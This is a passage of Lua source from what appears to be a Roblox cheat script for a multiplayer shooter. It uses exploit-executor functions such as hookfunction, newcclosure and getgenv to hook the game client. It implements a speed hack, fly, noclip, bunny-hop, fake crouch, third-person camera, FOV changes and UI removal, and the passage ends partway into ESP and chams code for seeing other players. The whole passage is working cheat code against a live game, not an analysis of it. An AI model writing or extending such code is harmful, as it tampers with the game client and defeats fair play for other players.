            client.ReturnNormal = wrappedRn
        end

        local cb = client.createbullethole
        if type(cb) == "function" then
            local oldCb = cb
            local function guardedCreateBulletHole(part, pos, ...)
                if isNanPos(pos) then return end
                return oldCb(part, pos, ...)
            end
            local wrappedCb = (newcclosure and newcclosure(guardedCreateBulletHole)) or guardedCreateBulletHole
            if hookfunction then
                local hooked = pcall(function()
                    oldCb = hookfunction(cb, wrappedCb)
                end)
                if hooked then
                    saved.usedHook = true
                    saved.cbWrapped = wrappedCb
                else
                    client.createbullethole = wrappedCb
                end
            else
                client.createbullethole = wrappedCb
            end
        end

        client.__valenokNanGuard = true
        NanParticleGuard.saved = saved
        NanParticleGuard.clientRef = client
    end)
end

NanParticleGuard.restore = function()
    local saved = NanParticleGuard.saved
    if not saved or not saved.client then return end
    pcall(function()
        if restorefunction and saved.usedHook then
            if saved.rnWrapped then pcall(restorefunction, saved.rnWrapped) end
            if saved.cbWrapped then pcall(restorefunction, saved.cbWrapped) end
        else
            if saved.rnOrig then saved.client.ReturnNormal = saved.rnOrig end
            if saved.cbOrig then saved.client.createbullethole = saved.cbOrig end
        end
        saved.client.__valenokNanGuard = nil
    end)
    NanParticleGuard.saved = nil
    NanParticleGuard.clientRef = nil
end

task.spawn(function()
    for _ = 1, 20 do
        patchClientNanParticleGuard()
        if NanParticleGuard.clientRef and NanParticleGuard.clientRef.__valenokNanGuard then
            break
        end
        task.wait(0.5)
    end
end)

MoveUtil = {}

;(function()
local MOVE_KEY_W = Enum.KeyCode.W
local MOVE_KEY_A = Enum.KeyCode.A
local MOVE_KEY_S = Enum.KeyCode.S
local MOVE_KEY_D = Enum.KeyCode.D
local MOVE_KEY_SPACE = Enum.KeyCode.Space
local MOVE_KEY_SHIFT = Enum.KeyCode.LeftShift
local MOVE_KEY_CTRL = Enum.KeyCode.LeftControl
local AIR_MATERIAL = Enum.Material.Air

local function getLocalHumanoid()
    local _, humanoid = getCachedCharacterParts(LocalPlayer)
    return humanoid
end

local function getAliveMovementRig()
    local character = LocalPlayer.Character
    if not character or not character.Parent then return nil end

    local _, humanoid, rootPart = getCachedCharacterParts(LocalPlayer)
    if not humanoid then return nil end

    if humanoid.Health <= 0 then return nil end

    if not character:IsDescendantOf(Workspace) then return nil end

    if not rootPart then return nil end

    return character, humanoid, rootPart
end

local function getMoveAxes()
    local fwd = (UserInputService:IsKeyDown(MOVE_KEY_W) and 1 or 0) - (UserInputService:IsKeyDown(MOVE_KEY_S) and 1 or 0)
    local strafe = (UserInputService:IsKeyDown(MOVE_KEY_D) and 1 or 0) - (UserInputService:IsKeyDown(MOVE_KEY_A) and 1 or 0)
    return fwd, strafe
end

local function getHorizontalCameraDirection(camCFrame, fwd, strafe)
    if fwd == 0 and strafe == 0 then return nil, camCFrame.LookVector end

    local camLook = camCFrame.LookVector
    local camRight = camCFrame.RightVector
    local x = camLook.X * fwd + camRight.X * strafe
    local z = camLook.Z * fwd + camRight.Z * strafe
    local magSq = x * x + z * z
    if magSq <= 0.0001 then return nil, camLook end

    local invMag = 1 / math.sqrt(magSq)
    return Vector3.new(x * invMag, 0, z * invMag), camLook
end

MoveUtil.applyCameraCFrameMove = function(rootPart, cam, speed, dt)
    local fwd, strafe = getMoveAxes()
    local direction = getHorizontalCameraDirection(cam.CFrame, fwd, strafe)
    if not direction then return end

    rootPart.CFrame = rootPart.CFrame + direction * (speed * dt)
end

MoveUtil.applyFlyMove = function(rootPart, camCFrame, speed, dt)
    local fwd, strafe = getMoveAxes()
    local vert = (UserInputService:IsKeyDown(MOVE_KEY_SPACE) and 1 or 0) - (UserInputService:IsKeyDown(MOVE_KEY_SHIFT) and 1 or 0)
    if fwd == 0 and strafe == 0 and vert == 0 then return end

    local camLook = camCFrame.LookVector
    local camRight = camCFrame.RightVector
    local x = camLook.X * fwd + camRight.X * strafe
    local y = camLook.Y * fwd + camRight.Y * strafe + vert
    local z = camLook.Z * fwd + camRight.Z * strafe
    local magSq = x * x + y * y + z * z
    if magSq <= 0 then return end

    rootPart.CFrame = rootPart.CFrame + (Vector3.new(x, y, z) * (speed * dt / math.sqrt(magSq)))
end

MoveUtil.getLocalHumanoid = getLocalHumanoid
MoveUtil.getAliveMovementRig = getAliveMovementRig
MoveUtil.MOVE_KEY_SPACE = MOVE_KEY_SPACE
MoveUtil.MOVE_KEY_CTRL = MOVE_KEY_CTRL
MoveUtil.AIR_MATERIAL = AIR_MATERIAL
MoveUtil.ZERO_VECTOR = Vector3.new(0, 0, 0)
end)()

MoveLoop = { rs = {}, hb = {}, st = {}, rsConn = nil, hbConn = nil, stConn = nil, rsN = 0, hbN = 0, stN = 0 }

moveLoopEnsure = function(bucket)
    if bucket == "rs" then
        if MoveLoop.rsConn then return end
        MoveLoop.rsConn = RunService.RenderStepped:Connect(function(dt)
            local char, hum, hrp = MoveUtil.getAliveMovementRig()
            for _, fn in pairs(MoveLoop.rs) do pcall(fn, dt, char, hum, hrp) end
        end)
    elseif bucket == "hb" then
        if MoveLoop.hbConn then return end
        MoveLoop.hbConn = RunService.Heartbeat:Connect(function(dt)
            local char, hum, hrp = MoveUtil.getAliveMovementRig()
            for _, fn in pairs(MoveLoop.hb) do pcall(fn, dt, char, hum, hrp) end
        end)
    elseif bucket == "st" then
        if MoveLoop.stConn then return end
        MoveLoop.stConn = RunService.Stepped:Connect(function()
            local char, hum, hrp = MoveUtil.getAliveMovementRig()
            for _, fn in pairs(MoveLoop.st) do pcall(fn, 0, char, hum, hrp) end
        end)
    end
end

function MoveLoop.set(bucket, key, fn)
    local map = MoveLoop[bucket]
    if not map then return end
    local had = map[key] ~= nil
    if fn then
        map[key] = fn
        if not had then
            if bucket == "rs" then MoveLoop.rsN = MoveLoop.rsN + 1
            elseif bucket == "hb" then MoveLoop.hbN = MoveLoop.hbN + 1
            else MoveLoop.stN = MoveLoop.stN + 1 end
        end
        moveLoopEnsure(bucket)
    elseif had then
        map[key] = nil
        if bucket == "rs" then
            MoveLoop.rsN = math.max(0, MoveLoop.rsN - 1)
            if MoveLoop.rsN == 0 and MoveLoop.rsConn then MoveLoop.rsConn:Disconnect(); MoveLoop.rsConn = nil end
        elseif bucket == "hb" then
            MoveLoop.hbN = math.max(0, MoveLoop.hbN - 1)
            if MoveLoop.hbN == 0 and MoveLoop.hbConn then MoveLoop.hbConn:Disconnect(); MoveLoop.hbConn = nil end
        else
            MoveLoop.stN = math.max(0, MoveLoop.stN - 1)
            if MoveLoop.stN == 0 and MoveLoop.stConn then MoveLoop.stConn:Disconnect(); MoveLoop.stConn = nil end
        end
    end
end

function MoveLoop.clear()
    if MoveLoop.rsConn then pcall(function() MoveLoop.rsConn:Disconnect() end); MoveLoop.rsConn = nil end
    if MoveLoop.hbConn then pcall(function() MoveLoop.hbConn:Disconnect() end); MoveLoop.hbConn = nil end
    if MoveLoop.stConn then pcall(function() MoveLoop.stConn:Disconnect() end); MoveLoop.stConn = nil end
    table.clear(MoveLoop.rs); table.clear(MoveLoop.hb); table.clear(MoveLoop.st)
    MoveLoop.rsN, MoveLoop.hbN, MoveLoop.stN = 0, 0, 0
end

local Shared = {}

;(function()
Shared.SpeedHackState = { Conn = nil, OrigSpeed = nil, Humanoid = nil }

Shared.restoreSpeedHackOriginal = function()
    local humanoid = Shared.SpeedHackState.Humanoid
    if (not humanoid or not humanoid.Parent) then
        humanoid = MoveUtil.getLocalHumanoid()
    end

    if humanoid and Shared.SpeedHackState.OrigSpeed ~= nil then
        humanoid.WalkSpeed = Shared.SpeedHackState.OrigSpeed
    end

    Shared.SpeedHackState.OrigSpeed = nil
    Shared.SpeedHackState.Humanoid = nil
end

updateSpeedHack = function()
    MoveLoop.set("rs", "SpeedHack", nil)
    Shared.SpeedHackState.Conn = nil
    if not (Toggles.SpeedHackEnable and Toggles.SpeedHackEnable.Value) then
        pcall(Shared.restoreSpeedHackOriginal)
        return
    end

    MoveLoop.set("rs", "SpeedHack", function(dt, char, hum, hrp)
        if not isKeybindActive(Options.SpeedHackKeybind) then
            Shared.restoreSpeedHackOriginal()
            return
        end
        if not hum or not hrp then return end

        if Shared.SpeedHackState.Humanoid ~= hum then
            if Shared.SpeedHackState.Humanoid and Shared.SpeedHackState.Humanoid.Parent and Shared.SpeedHackState.OrigSpeed ~= nil then
                Shared.SpeedHackState.Humanoid.WalkSpeed = Shared.SpeedHackState.OrigSpeed
            end
            Shared.SpeedHackState.Humanoid = hum
            Shared.SpeedHackState.OrigSpeed = hum.WalkSpeed
        elseif Shared.SpeedHackState.OrigSpeed == nil then
            Shared.SpeedHackState.OrigSpeed = hum.WalkSpeed
        end

        local speed = Options.SpeedHackSpeed and Options.SpeedHackSpeed.Value or 50
        hum.WalkSpeed = speed

        local cam = getCamera()
        if not cam then return end
        MoveUtil.applyCameraCFrameMove(hrp, cam, speed, dt)
    end)
    Shared.SpeedHackState.Conn = true
end

Shared.AutoCrouchState = { Conn = nil, WasInAir = false }
Shared.FakeDuckState = { Conn = nil, Track = nil, Humanoid = nil }

local function stopFakeDuck()
    local track = Shared.FakeDuckState.Track
    if track then
        pcall(function() track:Stop() end)
        Shared.FakeDuckState.Track = nil
    end
    Shared.FakeDuckState.Humanoid = nil
end

updateFakeDuck = function()
    MoveLoop.set("rs", "FakeDuck", nil)
    Shared.FakeDuckState.Conn = nil
    stopFakeDuck()
    if not (Toggles.FakeDuckEnable and Toggles.FakeDuckEnable.Value) then return end

    MoveLoop.set("rs", "FakeDuck", function(_, char, hum)
        if not (Toggles.FakeDuckEnable and Toggles.FakeDuckEnable.Value) then
            stopFakeDuck()
            return
        end

        local active = isKeybindActive(Options.FakeDuckKeybind)
        if not active or not hum then
            stopFakeDuck()
            return
        end

        if Shared.FakeDuckState.Track and Shared.FakeDuckState.Humanoid == hum then
            if Shared.FakeDuckState.Track.IsPlaying == false then
                pcall(function() Shared.FakeDuckState.Track:Play() end)
            end
            return
        end

        stopFakeDuck()

        local pg = getPlayerGui()
        local client = pg and pg:FindFirstChild("Client")
        local idle = client and client:FindFirstChild("Idle")
        if not idle or not idle:IsA("Animation") then return end

        local ok, track = pcall(function()
            return hum:LoadAnimation(idle)
        end)
        if ok and track then
            Shared.FakeDuckState.Track = track
            Shared.FakeDuckState.Humanoid = hum
            pcall(function() track:Play() end)
        end
    end)
    Shared.FakeDuckState.Conn = true
end

updateAutoCrouch = function()
    MoveLoop.set("rs", "AutoCrouch", nil)
    Shared.AutoCrouchState.Conn = nil
    Shared.AutoCrouchState.WasInAir = false
    if not (Toggles.AutoCrouchEnable and Toggles.AutoCrouchEnable.Value) then
        VirtualInputManager:SendKeyEvent(false, MoveUtil.MOVE_KEY_CTRL, false, game)
        return
    end

    MoveLoop.set("rs", "AutoCrouch", function(_, char, hum)
        if not hum then return end
        local inAir = hum.FloorMaterial == MoveUtil.AIR_MATERIAL
        if inAir and not Shared.AutoCrouchState.WasInAir then
            VirtualInputManager:SendKeyEvent(true, MoveUtil.MOVE_KEY_CTRL, false, game)
            Shared.AutoCrouchState.WasInAir = true
        elseif not inAir and Shared.AutoCrouchState.WasInAir then
            VirtualInputManager:SendKeyEvent(false, MoveUtil.MOVE_KEY_CTRL, false, game)
            Shared.AutoCrouchState.WasInAir = false
        end
    end)
    Shared.AutoCrouchState.Conn = true
end

Shared.BhopState = { Conn = nil, LastWalkSpeed = nil }
Shared.LegitBhopState = { Conn = nil, JumpCount = 0, WasInAir = false, DefaultSpeed = 16, LastWalkSpeed = nil }
Shared.AutoJumpState = { Conn = nil }
Shared.NoclipState = { Conn = nil, DescendantConn = nil, Saved = {}, Parts = {}, Character = nil }
Shared.FlyState = { Conn = nil }

local function setWalkSpeedIfChanged(state, hum, speed)
    if state.LastWalkSpeed == speed and hum.WalkSpeed == speed then return end
    hum.WalkSpeed = speed
    state.LastWalkSpeed = speed
end

updateBhop = function()
    MoveLoop.set("hb", "Bhop", nil)
    Shared.BhopState.Conn = nil
    Shared.BhopState.LastWalkSpeed = nil
    local humanoid = MoveUtil.getLocalHumanoid()
    if humanoid then
        humanoid.WalkSpeed = CONSTANTS.DEFAULT_WALK_SPEED
    end
    if not (Toggles.BhopEnable and Toggles.BhopEnable.Value) then return end

    MoveLoop.set("hb", "Bhop", function(dt, char, hum, rootPart)
        local spaceHeld = UserInputService:IsKeyDown(MoveUtil.MOVE_KEY_SPACE)
        if not hum or not rootPart then return end

        if not spaceHeld then
            setWalkSpeedIfChanged(Shared.BhopState, hum, CONSTANTS.DEFAULT_WALK_SPEED)
            return
        end

        local grounded = hum.FloorMaterial ~= MoveUtil.AIR_MATERIAL
        if grounded then
            hum.Jump = true
        end

        local multiplier = Options.BhopMultiplier and Options.BhopMultiplier.Value or 1
        if not multiplier or multiplier <= 0 then multiplier = 1 end
        local targetSpeed = CONSTANTS.DEFAULT_WALK_SPEED * multiplier
        setWalkSpeedIfChanged(Shared.BhopState, hum, targetSpeed)

        if multiplier > 1 then
            local cam = getCamera()
            if cam then
                MoveUtil.applyCameraCFrameMove(rootPart, cam, targetSpeed - CONSTANTS.DEFAULT_WALK_SPEED, dt)
            end
        end
    end)
    Shared.BhopState.Conn = true
end

updateLegitBhop = function()
    MoveLoop.set("hb", "LegitBhop", nil)
    Shared.LegitBhopState.Conn = nil
    Shared.LegitBhopState.JumpCount = 0
    Shared.LegitBhopState.WasInAir = false
    Shared.LegitBhopState.LastWalkSpeed = nil
    local humanoid = MoveUtil.getLocalHumanoid()
    if humanoid then
        humanoid.WalkSpeed = CONSTANTS.DEFAULT_WALK_SPEED
    end
    if not (Toggles.LegitBhopEnable and Toggles.LegitBhopEnable.Value) then return end

    MoveLoop.set("hb", "LegitBhop", function(_, char, hum, rootPart)
        local spaceHeld = UserInputService:IsKeyDown(MoveUtil.MOVE_KEY_SPACE)
        if not hum or not rootPart then return end

        local inAir = hum.FloorMaterial == MoveUtil.AIR_MATERIAL

        if not spaceHeld then
            if Shared.LegitBhopState.JumpCount ~= 0 then
                Shared.LegitBhopState.JumpCount = 0
            end
            Shared.LegitBhopState.WasInAir = inAir
            setWalkSpeedIfChanged(Shared.LegitBhopState, hum, CONSTANTS.DEFAULT_WALK_SPEED)
            return
        end

        if inAir then
            Shared.LegitBhopState.WasInAir = true
        elseif Shared.LegitBhopState.WasInAir then
            hum.Jump = true
            Shared.LegitBhopState.JumpCount = math.min(Shared.LegitBhopState.JumpCount + 1, 15)
            Shared.LegitBhopState.WasInAir = false
        else

            hum.Jump = true
        end

        local maxMult = Options.LegitBhopMultiplier and Options.LegitBhopMultiplier.Value or 2
        if not maxMult or maxMult < 1 then maxMult = 1 end
        local multiplier = 1 + (Shared.LegitBhopState.JumpCount / 15) * (maxMult - 1)
        setWalkSpeedIfChanged(Shared.LegitBhopState, hum, CONSTANTS.DEFAULT_WALK_SPEED * multiplier)
    end)
    Shared.LegitBhopState.Conn = true
end

Shared.clearNoclipRuntime = function()
    if Shared.NoclipState.DescendantConn then
        Shared.NoclipState.DescendantConn:Disconnect()
        Shared.NoclipState.DescendantConn = nil
    end
    Shared.NoclipState.Character = nil
    Shared.NoclipState.Parts = {}
end

Shared.restoreNoclipParts = function()
    for part, canCollide in pairs(Shared.NoclipState.Saved) do
        if part and part.Parent then part.CanCollide = canCollide end
    end
    Shared.NoclipState.Saved = {}
    Shared.clearNoclipRuntime()
end

local function trackNoclipPart(part)
    if not part:IsA("BasePart") then return end
    if Shared.NoclipState.Saved[part] == nil then
        Shared.NoclipState.Saved[part] = part.CanCollide
        Shared.NoclipState.Parts[#Shared.NoclipState.Parts + 1] = part
    end
    if part.CanCollide then
        part.CanCollide = false
    end
end

local function setNoclipCharacter(character)
    if Shared.NoclipState.Character == character then return end
    Shared.clearNoclipRuntime()
    Shared.NoclipState.Character = character

    for _, part in ipairs(character:GetDescendants()) do
        trackNoclipPart(part)
    end

    Shared.NoclipState.DescendantConn = character.DescendantAdded:Connect(trackNoclipPart)
end

updateNoclip = function()
    MoveLoop.set("st", "Noclip", nil)
    Shared.NoclipState.Conn = nil

    Shared.restoreNoclipParts()

    if not (Toggles.NoclipEnable and Toggles.NoclipEnable.Value) then return end

    MoveLoop.set("st", "Noclip", function()
        local character = LocalPlayer.Character
        if not character then return end

        setNoclipCharacter(character)
        local parts = Shared.NoclipState.Parts
        for i = #parts, 1, -1 do
            local part = parts[i]
            if part and part.Parent then
                if part.CanCollide then
                    part.CanCollide = false
                end
            else
                table.remove(parts, i)
            end
        end
    end)
    Shared.NoclipState.Conn = true
end

Shared.restoreFlyPhysics = function()
    local hum = MoveUtil.getLocalHumanoid()
    if hum then hum.PlatformStand = false end
end

updateFly = function()
    MoveLoop.set("rs", "Fly", nil)
    Shared.FlyState.Conn = nil

    pcall(Shared.restoreFlyPhysics)

    if not (Toggles.FlyEnable and Toggles.FlyEnable.Value) then return end

    MoveLoop.set("rs", "Fly", function(dt, char, humanoid, rootPart)
        if not rootPart then
            if humanoid then humanoid.PlatformStand = false end
            return
        end

        humanoid.PlatformStand = true

        local cam = getCamera()
        if not cam then return end

        local speed = Options.FlySpeed and Options.FlySpeed.Value or 50
        MoveUtil.applyFlyMove(rootPart, cam.CFrame, speed, dt)
        rootPart.AssemblyLinearVelocity = MoveUtil.ZERO_VECTOR
    end)
    Shared.FlyState.Conn = true
end

Shared.ThirdPersonCache = { arms = nil, parts = nil, lastHideState = nil }

updateThirdPerson = function()
    local isThirdPersonActive = tv("ThirdPersonEnable") and isKeybindActive(Options.ThirdPersonKeybind)
    local targetDist = isThirdPersonActive and (Options.ThirdPersonDistance and Options.ThirdPersonDistance.Value or 5) or 0.5
    if LocalPlayer.CameraMaxZoomDistance ~= targetDist then LocalPlayer.CameraMaxZoomDistance = targetDist end
    if LocalPlayer.CameraMinZoomDistance ~= targetDist then LocalPlayer.CameraMinZoomDistance = targetDist end
    local _, humanoid = getCachedCharacterParts(LocalPlayer)
    if humanoid then
        humanoid.AutoRotate = (not tv("AntiAimYawEnable")) and (not isThirdPersonActive)
    end
    local cam = getCamera()
    local arms = cam and cam:FindFirstChild("Arms")
    if not arms then return end
    local hideState = isThirdPersonActive and tv("ThirdPersonHideVM")
    if arms ~= Shared.ThirdPersonCache.arms then
        Shared.ThirdPersonCache.arms, Shared.ThirdPersonCache.parts, Shared.ThirdPersonCache.lastHideState = arms, {}, nil
        for _, part in ipairs(arms:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                Shared.ThirdPersonCache.parts[#Shared.ThirdPersonCache.parts + 1] = part
            end
        end
    end
    if Shared.ThirdPersonCache.parts and hideState ~= Shared.ThirdPersonCache.lastHideState then
        Shared.ThirdPersonCache.lastHideState = hideState
        local ltm = hideState and 1 or 0
        for i = 1, #Shared.ThirdPersonCache.parts do Shared.ThirdPersonCache.parts[i].LocalTransparencyModifier = ltm end
    end
end

Shared.ThirdPersonNoClipBound = false
Shared.updateThirdPersonNoClip = function()
    if Shared.ThirdPersonNoClipBound then
        pcall(function() RunService:UnbindFromRenderStep("ValenokTPNoClip") end)
        Shared.ThirdPersonNoClipBound = false
    end
    if not (Toggles.ThirdPersonEnable and Toggles.ThirdPersonEnable.Value
        and Toggles.ThirdPersonNoClip and Toggles.ThirdPersonNoClip.Value) then return end

    RunService:BindToRenderStep("ValenokTPNoClip", Enum.RenderPriority.Camera.Value + 1, function()
        local tpEnabled = Toggles.ThirdPersonEnable and Toggles.ThirdPersonEnable.Value
        local isKeyActive = isKeybindActive(Options.ThirdPersonKeybind)
        if not (tpEnabled and isKeyActive) then return end

        local cam = getCamera()
        if not cam then return end
        local char = LocalPlayer.Character
        if not char then return end
        local _, hum, hrp = getCachedCharacterParts(LocalPlayer)
        if not hrp or not hum or hum.Health <= 0 then return end

        local dist = Options.ThirdPersonDistance and Options.ThirdPersonDistance.Value or 5
        local lookDir = cam.CFrame.LookVector
        local camPos = hrp.Position - lookDir * dist + Vector3.new(0, 2, 0)
        cam.CFrame = CFrame.new(camPos) * cam.CFrame.Rotation
    end)
    Shared.ThirdPersonNoClipBound = true
end

updateAutoJump = function()
    MoveLoop.set("hb", "AutoJump", nil)
    Shared.AutoJumpState.Conn = nil
    if not (Toggles.AutoJumpEnable and Toggles.AutoJumpEnable.Value) then return end

    MoveLoop.set("hb", "AutoJump", function(_, char, humanoid)
        if not UserInputService:IsKeyDown(MoveUtil.MOVE_KEY_SPACE) then return end
        if not humanoid then return end
        if humanoid.FloorMaterial == MoveUtil.AIR_MATERIAL then return end

        humanoid.Jump = true
    end)
    Shared.AutoJumpState.Conn = true
end

Shared.AmbienceSavedLighting = nil
Shared.MiscState = { ambienceDirty = false }

Shared.applyRemoveRadio = function()
    if not Toggles.MiscRemoveRadio then return end
    local pg = getPlayerGui()
    if pg and pg:FindFirstChild("GUI") then
        local suitZoom = pg.GUI:FindFirstChild("SuitZoom")
        if suitZoom then suitZoom.Visible = not Toggles.MiscRemoveRadio.Value end
    end
end

Shared.FovChangerBound = false
Shared.applyFovChanger = function()
    local cam = getCamera()
    if not cam then return end
    if Toggles.VisualFovChanger and Toggles.VisualFovChanger.Value then
        if not Shared.FovChangerBound then
            pcall(function() RunService:UnbindFromRenderStep("ValenokFovChanger") end)
            RunService:BindToRenderStep("ValenokFovChanger", Enum.RenderPriority.Camera.Value + 1, function()
                local c = getCamera()
                if not c or not (Toggles.VisualFovChanger and Toggles.VisualFovChanger.Value) then return end
                local pg = getPlayerGui()
                local scope = pg and pg:FindFirstChild("GUI") and pg.GUI:FindFirstChild("Crosshairs") and pg.GUI.Crosshairs:FindFirstChild("Scope")
                if not (scope and scope.Visible) then
                    local fovVal = Options.VisualFovValue and Options.VisualFovValue.Value or 80
                    if c.FieldOfView ~= fovVal then c.FieldOfView = fovVal end
                end
            end)
            Shared.FovChangerBound = true
        end
    else
        if Shared.FovChangerBound then
            pcall(function() RunService:UnbindFromRenderStep("ValenokFovChanger") end)
            Shared.FovChangerBound = false
        end
        cam.FieldOfView = 80
    end
end
Shared.unbindFovChanger = function()
    if Shared.FovChangerBound then
        pcall(function() RunService:UnbindFromRenderStep("ValenokFovChanger") end)
        Shared.FovChangerBound = false
    end
end

Shared.applyRemoveUIElements = function()
    local TARGET_GUIS = {
        "Game", "GUI", "HUDShading", "CBScoreboard",
        "SmokeGUI", "Performance", "Objective", "Crates",
        "NewItem", "BanBoi", "Blnd", "Winner", "RoundWin",
        "WinGui", "RoundEnd", "Win",
    }
    local function clearOriginalState()
        local conns = getgenv().HUD_Connections
        if conns then
            for _, data in pairs(conns) do
                if data.Connection then data.Connection:Disconnect() end
                if data.AncestryConn then data.AncestryConn:Disconnect() end
                if data.PropConns then
                    for _, pConn in pairs(data.PropConns) do pConn:Disconnect() end
                end
            end
        end
        getgenv().HUD_Connections = nil
        getgenv().HUD_OriginalState = nil
    end
    local function hideObject(instance)
        if not instance or (not instance:IsA("GuiObject") and not instance:IsA("UIStroke")) then return end
        if instance:IsA("ScreenGui") then return end
        local whitelist = {"BuyMenu", "Crosshair", "Crosshairs", "SuitZoom", "Scope", "Cursor", "Reticle"}
        for _, name in pairs(whitelist) do
            if instance.Name == name or instance:FindFirstAncestor(name) then return end
        end
        local existingConnections = getgenv().HUD_Connections
        if existingConnections and existingConnections[instance] then return end
        local cache = getgenv().HUD_OriginalState or {}
        getgenv().HUD_OriginalState = cache
        if not cache[instance] then
            local state = {
                Visible = instance:IsA("GuiObject") and instance.Visible or nil,
                BackgroundTransparency = instance:IsA("GuiObject") and instance.BackgroundTransparency or nil,
                BorderSizePixel = instance:IsA("GuiObject") and instance.BorderSizePixel or nil,
            }
            if instance:IsA("ImageLabel") or instance:IsA("ImageButton") then
                state.ImageTransparency = instance.ImageTransparency
            elseif instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
                state.TextTransparency = instance.TextTransparency
            elseif instance:IsA("UIStroke") then
                state.Transparency = instance.Transparency
                state.Enabled = instance.Enabled
            end
            cache[instance] = state
        end
        local propConns = {}
        local function applyHidden()
            if instance:IsA("GuiObject") then
                instance.Visible = false
                instance.BackgroundTransparency = 1
                instance.BorderSizePixel = 0
                if instance:IsA("ImageLabel") or instance:IsA("ImageButton") then
                    instance.ImageTransparency = 1
                elseif instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
                    instance.TextTransparency = 1
                end
            elseif instance:IsA("UIStroke") then
                instance.Enabled = false
                instance.Transparency = 1
            end
        end
        applyHidden()
        if instance:IsA("GuiObject") then
            table.insert(propConns, instance:GetPropertyChangedSignal("Visible"):Connect(applyHidden))
            table.insert(propConns, instance:GetPropertyChangedSignal("BackgroundTransparency"):Connect(applyHidden))
            if instance:IsA("ImageLabel") or instance:IsA("ImageButton") then
                table.insert(propConns, instance:GetPropertyChangedSignal("ImageTransparency"):Connect(applyHidden))
            elseif instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
                table.insert(propConns, instance:GetPropertyChangedSignal("TextTransparency"):Connect(applyHidden))
            end
        elseif instance:IsA("UIStroke") then
            table.insert(propConns, instance:GetPropertyChangedSignal("Enabled"):Connect(applyHidden))
            table.insert(propConns, instance:GetPropertyChangedSignal("Transparency"):Connect(applyHidden))
        end
        local conns = getgenv().HUD_Connections or {}
        getgenv().HUD_Connections = conns
        local data = {PropConns = propConns}
        data.AncestryConn = instance.AncestryChanged:Connect(function(_, parent)
            if parent then return end
            for _, pConn in pairs(data.PropConns) do pcall(function() pConn:Disconnect() end) end
            if getgenv().HUD_OriginalState then getgenv().HUD_OriginalState[instance] = nil end
            if getgenv().HUD_Connections then getgenv().HUD_Connections[instance] = nil end
        end)
        conns[instance] = data
    end
    local function recursiveHide(parent)
        hideObject(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child.Name == "BuyMenu" then continue end
            recursiveHide(child)
        end
    end
    local enabled = Toggles.MiscRemoveUI and Toggles.MiscRemoveUI.Value
    if enabled then
        clearOriginalState()
        getgenv().HUD_OriginalState = {}
        getgenv().HUD_Connections = {}
        local function processGui(gui)
            recursiveHide(gui)
            local conn = gui.DescendantAdded:Connect(function(child)
                hideObject(child)
            end)
            getgenv().HUD_Connections[gui] = getgenv().HUD_Connections[gui] or {}
            getgenv().HUD_Connections[gui].Connection = conn
        end
        local pg = getPlayerGui()
        if pg then
            for _, name in pairs(TARGET_GUIS) do
                local g = pg:FindFirstChild(name)
                if g and g:IsA("ScreenGui") then
                    processGui(g)
                end
            end
            local mainConn = pg.ChildAdded:Connect(function(child)
                for _, name in pairs(TARGET_GUIS) do
                    if child.Name == name and child:IsA("ScreenGui") then
                        processGui(child)
                    end
                end
            end)
            getgenv().HUD_Connections["Main"] = {Connection = mainConn}
        end
    else
        local cache = getgenv().HUD_OriginalState
        if cache then
            for inst, state in pairs(cache) do
                if inst and inst.Parent then
                    if inst:IsA("GuiObject") then
                        inst.Visible = state.Visible
                        inst.BackgroundTransparency = state.BackgroundTransparency
                        inst.BorderSizePixel = state.BorderSizePixel
                        if state.ImageTransparency then inst.ImageTransparency = state.ImageTransparency end
                        if state.TextTransparency then inst.TextTransparency = state.TextTransparency end
                    elseif inst:IsA("UIStroke") then
                        inst.Enabled = state.Enabled
                        inst.Transparency = state.Transparency
                    end
                end
            end
        end
        clearOriginalState()
    end
end

Shared.hideDrawingSet = function(drawingSet, resetRect)
    if not drawingSet then return end
    drawingSet.Box.Visible, drawingSet.BoxOutline.Visible, drawingSet.BoxFill.Visible = false, false, false
    drawingSet.Name.Visible, drawingSet.Weapon.Visible = false, false
    drawingSet.HealthBarOutline.Visible, drawingSet.HealthBarFill.Visible, drawingSet.HealthText.Visible = false, false, false
    if drawingSet.OofArrow then drawingSet.OofArrow.Visible = false end
    if drawingSet.OofArrowOutline then drawingSet.OofArrowOutline.Visible = false end
    if resetRect then drawingSet.Rect = nil end
end

Shared.removeDrawingSet = function(player)
    local ds = EspRuntime.Drawings[player]
    if not ds then return end
    EspRuntime.RemoveDrawingValue(ds)
    EspRuntime.Drawings[player] = nil
end

Shared.removeHighlight = function(player)
    local hl = EspRuntime.Highlights[player]
    if not hl then return end
    pcall(function() hl:Destroy() end)
    EspRuntime.Highlights[player] = nil
end

Shared.getDrawingSet = function(player)
    local ds = EspRuntime.Drawings[player]
    if ds then return ds end
    local W, B, G = Color3.fromRGB(255, 255, 255), Color3.fromRGB(0, 0, 0), Color3.fromRGB(0, 255, 0)
    ds = {
        Box = createSquare(CONSTANTS.ESP_BOX_THICKNESS, W),
        BoxOutline = createSquare(CONSTANTS.ESP_BOX_OUTLINE_THICKNESS, B),
        BoxFill = createSquare(1, W),
        Name = createText(),
        Weapon = createText(),
        Rect = nil,
        HealthBarOutline = createSquare(CONSTANTS.ESP_HEALTH_BAR_OUTLINE_THICKNESS, B),
        HealthBarFill = createSquare(1, G),
        HealthText = createText(),
        OofArrow = createTriangle(true, 1, W),
        OofArrowOutline = createTriangle(false, 2, B),
    }
    ds.BoxFill.Filled = true
    ds.HealthBarFill.Filled = true
    ds.BoxOutline.ZIndex, ds.Box.ZIndex = 1, 2
    ds.HealthBarOutline.ZIndex, ds.HealthBarFill.ZIndex = 1, 2
    EspRuntime.Drawings[player] = ds
    return ds
end

local function destroyPair(pair)
    if not pair then return end
    if pair.inner then pcall(function() pair.inner:Destroy() end) end
    if pair.outer then pcall(function() pair.outer:Destroy() end) end
end

local function clearPartChams(state)
    if not state or not state.Parts then return end
    for part, pair in pairs(state.Parts) do destroyPair(pair); state.Parts[part] = nil end
end

ChamsVisCache = {}

local function clearHighlightChams(player, state)
    if state and state.Highlight then pcall(function() state.Highlight:Destroy() end); state.Highlight = nil end
    local hl = EspRuntime.Highlights[player]
    if hl then pcall(function() hl:Destroy() end); EspRuntime.Highlights[player] = nil end
end

Shared.removePlayerChams = function(player)
    ChamsVisCache[player] = nil
